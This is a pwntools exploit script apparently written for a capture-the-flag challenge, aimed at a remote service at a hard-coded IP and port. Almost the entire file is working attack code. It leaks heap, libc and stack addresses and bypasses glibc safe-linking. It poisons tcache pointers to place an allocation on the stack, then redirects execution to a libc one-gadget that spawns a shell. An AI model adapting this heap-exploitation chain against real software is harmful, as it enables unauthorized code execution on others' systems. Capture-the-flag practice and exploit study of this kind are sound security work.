from pwn import *
	
elf = context.binary = ELF("chall")
libc = elf.libc


while True:

    try:
        env = {}
        env["LD_PRELOAD"] = "./libc/libc.so.6"
        # p = process(env=env)
        # p = process(aslr=False,env=env)
        p = remote("34.252.33.37",6969)
        p.recvline()


        # leak heap key
        p.sendlineQ("1")
        p.sendline("1")
        p.sendline("sub")
        p.sendline("or")
        p.sendline("or")
        p.sendline("or")
        p.sendline("or")
        p.sendline("0")
        p.sendline("and")
        p.sendline("and")
        p.sendline("and")
        p.sendline("and")
        p.sendline("or")
        p.sendline("end")
        p.recvuntil(": ")
        key = int(p.recvline())
        print("key",hex(key))



        # get a unsorted bin chunk
        for i in range(0x280):
            p.sendline("0")



        # point back  to it
        for i in range(0x280):
            p.sendline("and")

        # dont corrupt chunk
        p.sendline("or")
        p.sendline("and")
        p.sendline("or")
        p.sendline("and")
        p.sendline("and")

        # keep going back
        for i in range(0x1f0 + 2 * 5):
            p.sendline("and")
        p.sendline("or")


        # leak top libc, bc we can only do ops on ints
        # so we leak top 4 bytes and bottom 4 bytes
        p.sendline("end")
        p.recvuntil(": ")
        top_libc = int(p.recvline()) & 0xffffffff
        print("top_libc",hex(top_libc))


        # same operations to leak bottom libc
        for i in range(0x280):
            p.sendline("0")

        for i in range(0x280):
            p.sendline("and")

        p.sendline("or")
        p.sendline("and")
        p.sendline("or")
        p.sendline("and")
        p.sendline("and")

        for i in range(0x1f0 + 2 * 5):
            p.sendline("and")
        p.sendline("or")
        p.sendline("add")
        p.sendline(str(top_libc))
        p.sendline("sub")




        p.sendline("end")
        p.recvuntil(": ")
        bottom_libc = int(p.recvline())
        print("bottom_libc",hex(bottom_libc))


        # merge libc leaks
        libc_leak = top_libc << (4 * 8)  | bottom_libc
        print("libc_leak",hex(libc_leak))
        libc.address = libc_leak - 0x203b20
        print("libc.address",hex(libc.address))


        # get tcache 0x30
        for i in range(7):
            p.sendline("0")

        # point back to tcache 0x20 (second chunk)
        for i in range(7):
            p.sendline("and")
        p.sendline("or")
        p.sendline("and")
        p.sendline("and")
        p.sendline("and")
        p.sendline("and")
        p.sendline("and")
        p.sendline("and")
        p.sendline("and")


        # overwite next point with environ 
        environ = libc.sym["environ"] + 0x18
        environ_key = environ ^ key
        p.sendline(str(environ_key & 0xffffffff))
        p.sendline(str(( (environ >> (8 * 4)) ^ 5 )  & 0xffffffff))


        # leak top stack
        # stack world :)
        p.sendline("end")
        p.sendline(str(0))
        p.sendline(str(0))
        p.sendline("and")
        p.sendline("and")
        p.sendline("and")
        p.sendline("and")
        p.sendline(str(0x21))
        p.sendline("and")
        p.sendline("and")
        p.sendline("or")

        p.sendline("end")
        p.recvuntil(": ")
        p.recvuntil(": ")
        top_stack = int(p.recvline())
        print("top_stack",hex(top_stack))



        # leak bottom stack
        # stack world 2 :)
        p.sendline(str(0))
        p.sendline(str(0))
        p.sendline(str(0))
        p.sendline("and")
        p.sendline("and")
        p.sendline("and")
        p.sendline("and")
        p.sendline("and")
        p.sendline(str(0x41))
        p.sendline("and")
        p.sendline("and")
        p.sendline("and")
        p.sendline("or")
        p.sendline("end")

        p.recvuntil(": ")
        bottom_stack = int(p.recvline()) & 0xffffffff
        print("bottom_stack",hex(bottom_stack))

        # full stack leak
        stack_leak = (top_stack << (8 * 4) ) | bottom_stack 
        print("stack_leak",hex(stack_leak))



        # one last time to get a stack chunk
        # we overwite tcache 0x20 next point 

        for i in range(6):
            p.sendline("0")

        for i in range(6):
            p.sendline("and")

        p.sendline("or")
        p.sendline("and")
        p.sendline("and")
        p.sendline("and")
        p.sendline("and")
        p.sendline("and")
        p.sendline("and")
        p.sendline("and")
        # p.sendline(str(0xffffff))


        ret = stack_leak  - 0x130 - 8 + 0x30
        print("ret",hex(ret))


        # overwrite 
        ret_key = ret ^ key
        print("ret_key",hex(ret_key))
        print(ret_key & 0xffffffff)
        p.sendline(str(ret_key & 0xffffffff))
        p.sendline(str(( (ret >> (8 * 4)) ^ 5 )  & 0xffffffff))


        # allocate into the stack
        # now we have to controle 
        p.sendline("end")
        p.sendline(str(0))
        p.sendline(str(0))
        p.sendline("mul")
        p.sendline("mul")
        p.sendline("mul")
        p.sendline("mul")
        p.sendline(str(0x21))
        p.sendline(str(0))
        p.sendline("add")
        p.sendline("add")
        p.sendline(str(0x21))
        p.sendline("add")
        p.sendline("add")
        p.sendline(str(0))
        p.sendline("mul")
        p.sendline("mul")
        p.sendline("mul")
        p.sendline("mul")
        p.sendline("mul")
        p.sendline("mul")
        p.sendline("mul")
        p.sendline("mul")
        p.sendline("mul")
        p.sendline("mul")



        # we go back and we do a rop
        # to a one gadget

# 0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])
# constraints:
#   address rbp-0x50 is writable
#   rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
#   [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp


        rbp = stack_leak + 0x610
        p.sendline(str(rbp & 0xffffffff))
        p.sendline(str(( (rbp >> (8 * 4)) )  & 0xffffffff))

        one = libc.address + 0xef52b
        p.sendline(str(one & 0xffffffff))
        p.sendline(str(( (one >> (8 * 4)) )  & 0xffffffff))



        # exit and rop
        p.sendline("quit")
        p.sendline("id")


        p.interactive()
    except:
        p.close()

